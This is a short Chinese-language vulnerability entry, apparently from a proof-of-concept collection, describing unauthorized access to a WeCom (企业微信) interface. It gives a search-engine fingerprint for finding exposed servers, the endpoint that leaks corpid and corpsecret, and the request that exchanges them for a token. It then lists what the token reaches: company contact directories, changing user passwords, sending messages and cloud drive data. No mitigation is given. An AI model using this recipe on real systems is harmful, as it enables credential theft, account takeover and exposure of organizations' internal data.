# 企业微信接口未授权访问漏洞

- **系统**：企业微信接口　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`hunter：`web.icon=="e1750fed09bcc7df102a0e593ffe2b69"``
- **请求**：`https://<企业微信域名>/cgi-bin/gateway/agentinfo`

**请求体 / payload**
```
1. 通过泄露信息接口可以获取`corpid`和`corpsecret`
2. 使用`corpsecret`和`corpid`获得`token`，其中`corpid`为上图中`strcorpid`、`corpsecret`为上图中`Secret`
https://<企业微信域名>/cgi-bin/gettoken?corpid=ID&corpsecret=SECRET
3. 使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口 具体利用查看[企业微信开发者中心文档](https://developer.work.weixin.qq.com/document/path/90664)
```
